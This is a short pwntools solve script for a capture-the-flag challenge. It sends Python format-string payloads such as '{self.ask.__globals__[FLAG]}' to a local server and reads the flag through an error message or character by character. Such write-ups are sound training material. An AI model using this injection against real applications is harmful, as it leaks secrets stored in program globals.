from pwn import *

# p = process(["python3", "./misc/outside_the_box/server.py"])
p = remote("localhost", 1337)

# exposure over error message
"""
p.recvuntil(b"you? ")
p.sendline("0".encode())
p.recvuntil(b" to be? ")
p.sendline("{self.ask.__globals__[FLAG]}>2".encode())
p.interactive()
"""

# exposure over iterating indexes
flag: str = ""
index = 0

while p:
    p.recvuntil(b"you? ")
    p.sendline("0".encode())
    p.recvuntil(b" to be? ")
    p.sendline(("{self.ask.__globals__[FLAG][" + str(index) + "]}>2").encode())
    
    p.recvline()
    letter: str = p.recvline().decode()[12]
    
    flag += letter
    index += 1

    if letter == "}":
        print(flag)
        p.close()
        break
